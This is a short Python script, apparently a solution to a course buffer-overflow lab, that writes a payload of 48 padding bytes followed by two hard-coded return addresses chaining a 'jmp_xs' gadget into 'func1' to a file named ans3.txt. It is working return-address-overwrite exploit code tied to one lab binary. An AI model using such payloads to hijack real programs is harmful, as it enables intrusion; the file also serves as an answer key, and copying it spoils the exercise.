import struct

payload  = b"A" * 48
payload += struct.pack("<Q", 0x401334)   # jmp_xs
payload += struct.pack("<Q", 0x401216)   # func1 (jmp_xs 会跳到这里)

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("payload written, len =", len(payload))
